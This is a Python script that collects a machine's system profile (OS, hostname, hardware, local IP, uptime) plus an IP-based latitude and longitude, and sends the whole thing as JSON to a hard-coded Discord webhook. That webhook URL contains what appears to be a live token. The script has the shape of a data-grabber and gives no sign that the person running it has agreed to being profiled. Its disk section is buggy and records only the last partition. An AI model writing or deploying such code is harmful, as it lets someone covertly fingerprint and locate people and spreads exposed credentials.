import platform
import psutil
import socket
import time
import GPUtil
from datetime import datetime, timedelta
import geocoder
import json
import requests

def get_system_info():
    system_info = {}

    # Basic system information
    system_info['System'] = platform.system()
    system_info['Node Name'] = platform.node()
    system_info['Release'] = platform.release()
    system_info['Version'] = platform.version()
    system_info['Machine'] = platform.machine()
    system_info['Processor'] = platform.processor()

    # CPU information
    system_info['Physical Cores'] = psutil.cpu_count(logical=False)
    system_info['Total Cores'] = psutil.cpu_count(logical=True)
    cpu_freq = psutil.cpu_freq()
    system_info['Max Frequency'] = f"{cpu_freq.max:.2f}Mhz"
    system_info['Min Frequency'] = f"{cpu_freq.min:.2f}Mhz"
    system_info['Current Frequency'] = f"{cpu_freq.current:.2f}Mhz"
    system_info['CPU Usage (%)'] = psutil.cpu_percent(interval=1)

    # Memory information
    memory = psutil.virtual_memory()
    system_info['Total Memory'] = f"{memory.total // (1024 ** 3)}GB"
    system_info['Available Memory'] = f"{memory.available // (1024 ** 3)}GB"
    system_info['Used Memory'] = f"{memory.used // (1024 ** 3)}GB"
    system_info['Memory Usage (%)'] = memory.percent

    # Disk information
    partitions = psutil.disk_partitions()
    for i, partition in enumerate(partitions):
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            system_info[f'Device'] = partition.device
            system_info[f'File System'] = partition.fstype
            system_info[f'Total'] = f"{partition_usage.total // (1024 ** 3)}GB"
            system_info[f'Used'] = f"{partition_usage.used // (1024 ** 3)}GB"
            system_info[f'Free'] = f"{partition_usage.free // (1024 ** 3)}GB"
            system_info[f'Usage (%)'] = partition_usage.percent
        except Exception as e:
            print(f"Error reading disk {partition.device}: {e}")

    # Network information
    system_info['Hostname'] = socket.gethostname()
    system_info['IP Address'] = socket.gethostbyname(socket.gethostname())

    # Boot time
    system_info['Boot Time'] = time.ctime(psutil.boot_time())

    # Battery information (if available)
    try:
        battery = psutil.sensors_battery()
        if battery:
            system_info['Battery'] = {
                'Percent': f"{battery.percent}%",
                'Plugged': "Yes" if battery.power_plugged else "No"
            }
    except Exception as e:
        print(f"Error reading battery information: {e}")

    # GPU information
    try:
        gpus = GPUtil.getGPUs()
        system_info['GPUs'] = []
        for i, gpu in enumerate(gpus):
            system_info['GPUs'].append({
                'Name': gpu.name,
                'Driver': gpu.driver,
                'Memory': f"{gpu.memoryTotal}MB",
                'Usage (%)': f"{gpu.load * 100}%",
                'Temperature': f"{gpu.temperature} °C"
            })
    except Exception as e:
        print(f"Error reading GPU information: {e}")

    # System uptime
    uptime = datetime.now() - datetime.fromtimestamp(psutil.boot_time())
    system_info['Uptime'] = str(timedelta(seconds=uptime.total_seconds()))

    # Get latitude and longitude
    g = geocoder.ip('me')
    if g.latlng:
        system_info['Latitude'] = g.latlng[0]
        system_info['Longitude'] = g.latlng[1]

    return system_info

def send_to_discord_webhook(webhook_url, data):
    payload = {
        'content': 'System Information:\n```json\n' + json.dumps(data, indent=4) + '\n```'
    }
    response = requests.post(webhook_url, json=payload)
    if response.status_code == 200:
        print("System information sent to Discord successfully.")
    else:
        print(f"Failed to send system information to Discord. Status code: {response.status_code}")

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1244054413325369545/UqyFn5PKVkV5MoisrZ9W6NWB0vgIaNYzcb_bkg22qjzSzPaN8DpCWr-wecnxqbQfNT_N"
    system_info = get_system_info()
    send_to_discord_webhook(webhook_url, system_info)
